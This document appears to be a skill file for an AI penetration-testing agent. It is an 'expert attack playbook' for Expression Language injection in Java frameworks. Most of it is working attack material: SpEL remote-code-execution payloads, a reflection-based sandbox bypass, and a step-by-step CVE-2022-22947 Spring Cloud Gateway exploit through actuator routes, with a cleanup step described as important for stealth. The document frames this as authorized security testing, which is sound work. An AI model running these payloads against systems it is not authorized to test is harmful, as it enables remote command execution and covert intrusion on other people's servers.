---
name: expression-language-injection
description: >-
  Expression Language injection playbook. Use when Java EL, SpEL, OGNL, or MVEL expressions may evaluate attacker-controlled input in Spring, Struts2, Confluence, or similar frameworks.
---

# SKILL: Expression Language Injection — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=enabled`. Trusted `policy.json` remains authoritative.

- Restrict activity to the exact TaskSpec scope. Use only bounded registry actions accepted by execution policy; exploitation work is limited to the operator's authorized, evidence-recorded scope.
- Preserve baseline and test ToolResults as Evidence, including errors and negative observations, before drawing a conclusion.
- Treat command examples as reference syntax; actual execution goes through the bounded shell_exec tool when the operator has authorized it.
- Complete only after every success criterion is assessed from cited evidence.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert EL injection techniques covering SpEL (Spring), OGNL (Struts2), and Java EL (JSP/JSF). Distinct from SSTI — EL injection targets expression evaluators in Java frameworks, not template engines. Covers sandbox bypass, `_memberAccess` manipulation, actuator abuse, and real-world CVE chains.

## 0. RELATED ROUTING

- `ssti-server-side-template-injection` for template engines (Jinja2, FreeMarker, Twig) — different attack surface
- `jndi-injection` when EL evaluation leads to JNDI lookup

**Key distinction**: SSTI targets template rendering engines; EL injection targets expression evaluators embedded in Java frameworks. They share detection probes (`${7*7}`) but diverge in exploitation.

---

## 1. DETECTION — POLYGLOT PROBES

```text
${7*7}              → 49 = SpEL, OGNL, or Java EL
#{7*7}              → 49 = SpEL (alternative syntax) or JSF EL
%{7*7}              → 49 = OGNL (Struts2)
${T(java.lang.Math).random()}  → random float = SpEL confirmed
%{#context}         → object dump = OGNL confirmed
```

### Disambiguation

| Response to `${7*7}` | Response to `%{7*7}` | Engine |
|---|---|---|
| 49 | literal `%{7*7}` | SpEL or Java EL |
| literal `${7*7}` | 49 | OGNL (Struts2) |
| 49 | 49 | Both may be active |

---

## 2. SpEL (SPRING EXPRESSION LANGUAGE)

### Where SpEL Appears

- `@Value("${...}")` annotations
- Spring Security expressions (`@PreAuthorize`)
- Spring Cloud Gateway route predicates and filters
- Thymeleaf `th:text="${...}"` (when combined with `__${...}__` preprocessing)
- Spring Data `@Query` with SpEL

### RCE via Runtime.exec

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### RCE with Output Capture (Commons IO)

```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())}
```

### RCE with Output Capture (Spring StreamUtils)

```java
#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}
```

### ProcessBuilder (alternative when Runtime is blocked)

```java
${new java.lang.ProcessBuilder(new String[]{"id"}).start()}
```

### Spring Cloud Gateway — CVE-2022-22947

Exploit via actuator to add malicious route with SpEL filter:

```bash
# Step 1: Add route with SpEL in filter (with output capture)
POST /actuator/gateway/routes/hacktest
Content-Type: application/json
{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {
      "name": "Result",
      "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream()))}"
    }
  }],
  "uri": "http://example.com",
  "predicates": [{"name": "Path", "args": {"_genkey_0": "/hackpath"}}]
}

# Step 2: Refresh routes to apply
POST /actuator/gateway/refresh

# Step 3: Trigger the route
GET /hackpath
# Response header "Result" contains command output

# Step 4: Clean up (important for stealth)
DELETE /actuator/gateway/routes/hacktest
POST /actuator/gateway/refresh
```

### SpEL Sandbox Bypass

When `SimpleEvaluationContext` is used (restricts `T()` operator):

```java
// Try reflection-based bypass:
${''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 3. OGNL (OBJECT-GRAPH NAVIGATION LANGUAGE)
- 4. JAVA EL (JSP / JSF)
- 5. DETECTION METHODOLOGY
- 6. QUICK REFERENCE
